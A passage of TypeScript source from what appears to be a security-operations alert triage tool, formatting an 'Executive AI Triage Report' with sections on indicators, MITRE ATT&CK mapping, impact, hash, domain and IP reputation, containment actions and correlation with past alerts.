  } else if (MOCK_TRIAGE_REPORTS[alert.id]) {
    report = { ...MOCK_TRIAGE_REPORTS[alert.id] };
  } else {
    report = generateFallbackTriageReport(alert);
  }

  // Correlate with historical archive and active alerts
  report.historicalCorrelation = getCorrelatedAndHistoricalAlerts(alert, allActiveAlerts, report);
  return report;
}

/**
 * Formats the entire report into the standardized plain text / markdown representation
 * requested by the user:
 * When (Trigger & Scope)
 * Key Indicators
 * Impact Assessment
 * Analysis Result give the hash value analysis from (virus total for hash value, Domain reputation, IPs analysis)(website reputation and category from symantec sitereview)
 * Conclusion & Action
 * Historical & Related Alert Correlation (Same User & Key Indicators Matching, Closed Benign vs True Positive)
 */
export function formatTriageReportAsText(report: ExecutiveTriageReport, alertTitle?: string): string {
  const hist = report.historicalCorrelation;

  let historicalSection = '';
  if (hist && hist.hasMatches) {
    historicalSection = `

PREVIOUS & RELATED ALERT CORRELATION (SAME USER & KEY INDICATORS)
--------------------------------------------------------------------------------
Intelligence Verdict:
  ${hist.summaryVerdict}

Correlation Totals:
  • Total Correlated Alerts: ${hist.totalMatches}
  • Historical Closed - TRUE POSITIVE: ${hist.truePositiveCount}
  • Historical Closed - BENIGN (False Positive): ${hist.benignCount}
  • Active Concurrent Alerts (Same Chain): ${hist.activeCount}

Detailed Correlated & Historical Alerts:
${hist.matchedAlerts
  .map(
    (m, i) =>
      `[${i + 1}] Alert ID: ${m.alertId}${m.incidentId ? ` (Incident: ${m.incidentId})` : ''}
    • Title:             ${m.title}
    • Platform / Client: ${m.source_platform} • ${m.client}
    • Timeline:          ${m.timestamp} (${m.relativeTime || 'Archived'})
    • Severity:          ${m.severity.toUpperCase()}
    • Match Criteria:    ${m.matchedBy.map((b) => `${b.type}: ${b.value}`).join(' | ')}
    • Disposition / Outcome: ${
      m.isHistoricalClosed
        ? m.closureResult === 'True Positive'
          ? 'CLOSED: TRUE POSITIVE (Confirmed Malicious Threat)'
          : 'CLOSED: BENIGN (False Positive / Authorized Activity)'
        : 'ACTIVE: IN-PROGRESS (Under Live Investigation)'
    }
    • Category:          ${m.closureCategory || 'Standard Incident Classification'}
    • Handled By:        ${m.closedBy || 'SOC Operations Team'}${m.closureTimestamp ? ` on ${m.closureTimestamp}` : ''}
    • Resolution Notes:  ${m.resolutionNotes}${
        m.actionsTaken && m.actionsTaken.length > 0
          ? `\n    • Remediation Taken: ${m.actionsTaken.join('; ')}`
          : ''
      }`
  )
  .join('\n\n')}`;
  } else if (hist) {
    historicalSection = `

PREVIOUS & RELATED ALERT CORRELATION (SAME USER & KEY INDICATORS)
--------------------------------------------------------------------------------
Intelligence Verdict:
  ${hist.summaryVerdict}
  • No prior alerts or historical incidents recorded for this user or key indicators across 365-day archive.`;
  }

  return `================================================================================
EXECUTIVE AI TRIAGE REPORT: ${alertTitle ? alertTitle.toUpperCase() : 'ALERT DOSSIER'}
================================================================================

WHEN (TRIGGER & SCOPE)
--------------------------------------------------------------------------------
Trigger Event:
  ${report.when.trigger}

Detection Scope:
  ${report.when.scope}

Timestamp & SLA:
  ${report.when.timestamp}

Affected Assets:
  ${report.when.affectedAssets.map((a) => `• ${a}`).join('\n  ')}

Affected User Identities:
  ${report.when.affectedUsers.map((u) => `• ${u}`).join('\n  ')}


KEY INDICATORS
--------------------------------------------------------------------------------
Indicator Summary:
  ${report.keyIndicators.iocSummary}

Specific Indicators of Compromise (IoCs):
  ${report.keyIndicators.indicators.map((i) => `• [${i.type}] ${i.value} (${i.note})`).join('\n  ')}

MITRE ATT&CK Mapping:
  ${report.keyIndicators.mitreTechniques.map((m) => `• ${m.id}: ${m.name} [Tactic: ${m.tactic}]`).join('\n  ')}


IMPACT ASSESSMENT
--------------------------------------------------------------------------------
Criticality Tier:
  ${report.impactAssessment.criticalityTier} (Assessed Risk: ${report.impactAssessment.riskLevel.toUpperCase()})

Business Impact:
  ${report.impactAssessment.businessImpact}

Data At Risk:
  ${report.impactAssessment.dataAtRisk}

Blast Radius:
  ${report.impactAssessment.blastRadius}


ANALYSIS RESULT
--------------------------------------------------------------------------------
1. VirusTotal for Hash Value Analysis:
   • File Hash (SHA256): ${report.analysisResult.hashAnalysis.sha256}
   • MD5:               ${report.analysisResult.hashAnalysis.md5 || 'N/A'}
   • Detection Ratio:   ${report.analysisResult.hashAnalysis.detectionRatio} (${report.analysisResult.hashAnalysis.maliciousCount}/${report.analysisResult.hashAnalysis.totalVendors} vendors)
   • Verdict:           ${report.analysisResult.hashAnalysis.verdict.toUpperCase()}
   • Malware Family:    ${report.analysisResult.hashAnalysis.malwareFamily}
   • Sandbox Behavior:  ${report.analysisResult.hashAnalysis.sandboxVerdict || 'N/A'}

2. Domain Reputation:
   • Domain:            ${report.analysisResult.domainReputation.domain}
   • Reputation Verdict:${report.analysisResult.domainReputation.reputationVerdict.toUpperCase()} (Threat Score: ${report.analysisResult.domainReputation.threatScore}/100)
   • Registrar:         ${report.analysisResult.domainReputation.registrar}
   • Age / Creation:    ${report.analysisResult.domainReputation.creationAge}
   • DNS Details:       ${report.analysisResult.domainReputation.dnsDetails}
   • Threat Category:   ${report.analysisResult.domainReputation.threatCategory}

3. IPs Analysis:
   • Target IP:         ${report.analysisResult.ipAnalysis.ip}
   • Reputation:        ${report.analysisResult.ipAnalysis.reputationVerdict.toUpperCase()}
   • ASN & Network:     ${report.analysisResult.ipAnalysis.asn}
   • Geolocation:       ${report.analysisResult.ipAnalysis.city ? `${report.analysisResult.ipAnalysis.city}, ` : ''}${report.analysisResult.ipAnalysis.country}
   • Threat Score:      AbuseIPDB Confidence ${report.analysisResult.ipAnalysis.abuseConfidenceScore}%
   • Categorization:    ${report.analysisResult.ipAnalysis.threatCategory}

4. Website Reputation & Category from Symantec SiteReview:
   • Queried Host/URL:  ${report.analysisResult.symantecSiteReview.targetUrlOrDomain}
   • Primary Category:  ${report.analysisResult.symantecSiteReview.primaryCategory}
   • Secondary Category:${report.analysisResult.symantecSiteReview.secondaryCategory || 'None'}
   • Security Risk:     ${report.analysisResult.symantecSiteReview.securityRisk.toUpperCase()}
   • Classification:    ${report.analysisResult.symantecSiteReview.threatClassification}
   • Filtering Policy:  ${report.analysisResult.symantecSiteReview.filteringPolicy}

Technical Analysis Summary:
  ${report.analysisResult.technicalDetails || 'Multi-platform telemetry verified and enriched through automated threat intelligence pipeline.'}


CONCLUSION & ACTION
--------------------------------------------------------------------------------
SOC Triage Verdict:
  ${report.conclusionAndAction.verdict}

Conclusion:
  ${report.conclusionAndAction.conclusion}

Immediate Containment Actions:
  ${report.conclusionAndAction.immediateActions.map((act, i) => `${i + 1}. ${act}`).join('\n  ')}

Containment Status:
  ${report.conclusionAndAction.containmentStatus}${historicalSection}
================================================================================`;
}
